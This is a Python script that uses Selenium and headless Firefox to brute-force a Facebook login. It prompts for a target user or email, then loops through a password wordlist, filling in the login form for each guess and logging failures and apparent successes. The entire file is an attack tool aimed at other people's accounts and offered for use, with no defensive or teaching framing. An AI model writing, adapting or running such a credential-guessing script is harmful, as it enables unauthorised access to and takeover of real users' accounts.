from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.firefox.options import Options
from colorama import Fore, Back, Style
import pathlib
import logging
import time


def delay(seconds):
    
    time.sleep(seconds)

class Main:

    def __init__(self):

        logging.basicConfig(
            level=logging.INFO,
            format='\r' + Fore.GREEN + '[%(asctime)s] Worker: ' + Style.RESET_ALL + '%(message)s', datefmt="%H:%M:%S"
        )
        
        self.dir = pathlib.Path(__file__).parent.resolve()
        self.driver = Service(rf"path to driver")

        self.options = Options()
        self.options.add_argument("--headless")
        self.options.add_argument("--start-maximized")
        self.driver = webdriver.Firefox(options=self.options, service=self.driver)
            
    def loginAcc(self, target, password):
        
        try:
            
            self.driver.get('https://www.facebook.com/login/device-based/regular/login')
            
            email = self.driver.find_element(By.ID, "email")
            email.send_keys(target)
            
            passw = self.driver.find_element(By.ID, "pass")
            passw.send_keys(password)
            
            submit = self.driver.find_element(By.ID, "loginbutton")
            submit.click()
            
            try:
                
                failed = self.driver.find_element(By.ID, "error_box")
                if failed:
                    logging.error(f'Failed to login => {password}')
                    
            except Exception as e:
                print(e)
                logging.info('Success Login')
            
        except Exception as e:
            logging.info(e)
            exit()
            
        
        
if __name__ == '__main__':
    
    fb = Main()
    usern = input("\nTarget User/Email: ")
    with open(r'password text path') as f:
        for passw in f:
            fb.loginAcc(usern, passw)
            
            
